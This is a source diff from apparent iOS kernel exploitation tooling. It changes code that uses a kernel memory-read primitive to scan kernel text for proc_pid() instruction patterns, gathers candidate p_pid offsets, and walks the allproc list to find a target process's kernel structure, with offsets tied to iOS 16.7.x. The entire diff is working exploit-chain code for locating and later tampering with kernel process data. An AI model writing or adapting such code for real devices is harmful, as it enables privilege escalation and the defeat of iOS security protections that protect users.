@@ -740,19 +740,23 @@ static BOOL SCKernelPtrValid(uint64_t addr) {
     return addr >= 0xFFFFFFF000000000ULL;
 }
 
-// Find proc_pid() accessor in __TEXT/__TEXT_EXEC to determine p_pid offset.
+// Find all proc_pid() accessor candidates in __TEXT/__TEXT_EXEC.
 // proc_pid() decompiles to: return *(arg1 + p_pid_offset)
 // ARM64: ldr w0, [x0, #imm]; ret
-static size_t SCFindProcPidOffset(SCKReadFunction kread, uint64_t kernelBase) {
+// Returns array of candidate offsets. The blog confirms p_pid=0x60 for
+// iOS 16.7.x (XNU 8796), but we find all candidates and try each.
+static size_t *SCFindAllPidOffsets(SCKReadFunction kread, uint64_t kernelBase,
+                                    size_t *outCount) {
+    *outCount = 0;
     struct mach_header_64 header = {0};
-    if (kread(kernelBase, &header, sizeof(header)) != 0) return 0;
-    if (header.magic != MH_MAGIC_64 || header.ncmds == 0 || header.ncmds > SCMaxLoadCommands) return 0;
+    if (kread(kernelBase, &header, sizeof(header)) != 0) return NULL;
+    if (header.magic != MH_MAGIC_64 || header.ncmds == 0 || header.ncmds > SCMaxLoadCommands) return NULL;
 
     uint8_t *commands = malloc(header.sizeofcmds);
-    if (!commands) return 0;
+    if (!commands) return NULL;
     if (kread(kernelBase + sizeof(header), commands, header.sizeofcmds) != 0) {
         free(commands);
-        return 0;
+        return NULL;
     }
 
     int64_t slide = 0;
@@ -778,17 +782,15 @@ static size_t SCFindProcPidOffset(SCKReadFunction kread, uint64_t kernelBase) {
         remaining -= cmd->cmdsize;
     }
     free(commands);
-    if (segCount == 0) return 0;
+    if (segCount == 0) return NULL;
 
-    // proc_pid() is: ldr w0, [x0, #offset]; ret
-    // Pattern: F9400XXX (ldr x) is wrong — ldr w0 is 0xB9400000 | (imm12<<10) | (Rn<<5) | Rt
-    // ldr w0, [x0, #imm] = 0xB9400000 | (imm/4 << 10) | (0 << 5) | 0
-    // But we want any ldr wN, [xM, #imm] followed by ret
-    // ldr wN, [xM, #imm]: bits 31-22 = 1011100101, mask 0xFFC00000 = 0xB9400000
-    // ret = 0xD65F03C0
+    // Collect unique offsets from ldr w0, [x0, #imm]; ret
     const size_t scanChunk = 8192;
     uint8_t *chunk = malloc(scanChunk);
-    if (!chunk) return 0;
+    if (!chunk) return NULL;
+
+    size_t *offsets = NULL;
+    size_t offsetsCapacity = 0;
 
     for (int si = 0; si < segCount; si++) {
         uint64_t scanEnd = segs[si].size;
@@ -805,27 +807,32 @@ static size_t SCFindProcPidOffset(SCKReadFunction kread, uint64_t kernelBase) {
                 uint32_t insn1 = *(uint32_t *)(chunk + i);
                 uint32_t insn2 = *(uint32_t *)(chunk + i + 4);
 
-                // ldr wN, [xM, #imm] followed by ret
-                if ((insn1 & 0xFFC00000) != 0xB9400000) continue;  // ldr wN, [xM, #imm]
+                // ldr w0, [x0, #imm] followed by ret
+                if ((insn1 & 0xFFC003FF) != 0xB9400000) continue;  // ldr w0, [x0, #imm]
                 if (insn2 != 0xD65F03C0) continue;                   // ret
 
-                // Extract offset: imm12 = (insn1 >> 10) & 0xFFF, scaled by 4
                 size_t pidOff = ((insn1 >> 10) & 0xFFF) * 4;
-                // p_pid is typically 0x20-0x100 on arm64 XNU
-                if (pidOff < 0x20 || pidOff > 0x200) continue;
+                if (pidOff < 0x10 || pidOff > 0x200) continue;
 
-                // Verify: the source register (Rn) should be x0 (arg1)
-                uint32_t rn = (insn1 >> 5) & 0x1F;
-                if (rn != 0) continue;
+                // Check if we already have this offset
+                BOOL found = NO;
+                for (size_t j = 0; j < *outCount; j++) {
+                    if (offsets[j] == pidOff) { found = YES; break; }
+                }
+                if (found) continue;
 
-                free(chunk);
-                return pidOff;
+                if (*outCount >= offsetsCapacity) {
+                    offsetsCapacity = offsetsCapacity ? offsetsCapacity * 2 : 16;
+                    offsets = realloc(offsets, offsetsCapacity * sizeof(size_t));
+                    if (!offsets) { free(chunk); return NULL; }
+                }
+                offsets[(*outCount)++] = pidOff;
             }
         }
     }
 
     free(chunk);
-    return 0;
+    return offsets;
 }
 
 // Find current_proc() function address in kernel __TEXT segment.
@@ -1045,7 +1052,7 @@ static uint64_t SCFindCurrentProc(SCKReadFunction kread,
                                    SCKernelDataSections *sections,
                                    pid_t targetPid,
                                    NSMutableDictionary *diagnostics,
-                                   size_t pidOffsetHint) {
+                                   const size_t *pidOffsets, size_t pidOffsetCount) {
     // Find allproc by leveraging the LIST_ENTRY(le_prev) invariant.
     //
     // On XNU, struct proc contains LIST_ENTRY(proc) p_list at some offset:
@@ -1168,20 +1175,26 @@ static uint64_t SCFindCurrentProc(SCKReadFunction kread,
                             if (kread(procAddr, walkBuf, procBufSize) != 0) break;
                         }
 
-                        if (pidOffsetHint > 0 && pidOffsetHint + 4 <= procBufSize) {
-                            // Check only the known p_pid offset
-                            if (*(uint32_t *)(walkBuf + pidOffsetHint) == (uint32_t)targetPid) {
-                                free(chunk); free(firstBuf); free(secondBuf); free(thirdBuf); free(walkBuf);
-                                diagnostics[@"allprocSection"] = [NSString stringWithUTF8String:scans[si].name];
-                                diagnostics[@"allprocOffset"] = @(offset + i);
-                                diagnostics[@"allprocAddress"] = SCHexAddress(allprocAddr);
-                                diagnostics[@"procListOffset"] = @(leOff);
-                                diagnostics[@"procPidOffset"] = @(pidOffsetHint);
-                                diagnostics[@"procAddress"] = SCHexAddress(procAddr);
-                                diagnostics[@"scanCandidates"] = @(totalCandidates);
-                                diagnostics[@"lePrevMatched"] = @(lePrevMatched);
-                                diagnostics[@"maxWalkLen"] = @(walkCount + 1);
-                                return procAddr;
+                        // Check candidate p_pid offsets first (from proc_pid accessor scan)
+                        // then fall back to scanning ALL 4-byte offsets
+                        if (pidOffsetCount > 0) {
+                            for (size_t pi = 0; pi < pidOffsetCount; pi++) {
+                                size_t pidOff = pidOffsets[pi];
+                                if (pidOff + 4 > procBufSize) continue;
+                                if (pidOff + 4 > leOff && pidOff < leOff + 16) continue;
+                                if (*(uint32_t *)(walkBuf + pidOff) == (uint32_t)targetPid) {
+                                    free(chunk); free(firstBuf); free(secondBuf); free(thirdBuf); free(walkBuf);
+                                    diagnostics[@"allprocSection"] = [NSString stringWithUTF8String:scans[si].name];
+                                    diagnostics[@"allprocOffset"] = @(offset + i);
+                                    diagnostics[@"allprocAddress"] = SCHexAddress(allprocAddr);
+                                    diagnostics[@"procListOffset"] = @(leOff);
+                                    diagnostics[@"procPidOffset"] = @(pidOff);
+                                    diagnostics[@"procAddress"] = SCHexAddress(procAddr);
+                                    diagnostics[@"scanCandidates"] = @(totalCandidates);
+                                    diagnostics[@"lePrevMatched"] = @(lePrevMatched);
+                                    diagnostics[@"maxWalkLen"] = @(walkCount + 1);
+                                    return procAddr;
+                                }
                             }
                         } else {
                             // Scan ALL 4-byte offsets for targetPid
@@ -1441,13 +1454,18 @@ static NSDictionary *SCRunVFSTest(SCKBaseFunction kbaseFunction,
 
     // Fallback: allproc scanning
     if (procAddr == 0) {
-        // Find p_pid offset by scanning for proc_pid() accessor in __TEXT
-        size_t pidOffset = SCFindProcPidOffset(kreadFunction, kernelBase);
-        result[@"procPidOffsetFromAccessor"] = pidOffset ? @(pidOffset) : @0;
-        if (pidOffset > 0) {
-            result[@"procPidOffsetHint"] = [NSString stringWithFormat:@"0x%zx", pidOffset];
+        // Find all candidate p_pid offsets from proc_pid() accessor pattern
+        size_t pidOffsetCount = 0;
+        size_t *pidOffsets = SCFindAllPidOffsets(kreadFunction, kernelBase, &pidOffsetCount);
+        NSMutableArray *offsetStrings = [NSMutableArray array];
+        for (size_t i = 0; i < pidOffsetCount; i++) {
+            [offsetStrings addObject:[NSString stringWithFormat:@"0x%zx", pidOffsets[i]]];
         }
-        procAddr = SCFindCurrentProc(kreadFunction, &sections, targetPid, result, pidOffset);
+        result[@"procPidOffsetsFromAccessors"] = offsetStrings;
+        result[@"procPidOffsetCount"] = @(pidOffsetCount);
+
+        procAddr = SCFindCurrentProc(kreadFunction, &sections, targetPid, result, pidOffsets, pidOffsetCount);
+        free(pidOffsets);
         if (procAddr) {
             result[@"procSource"] = @"allproc";
         }
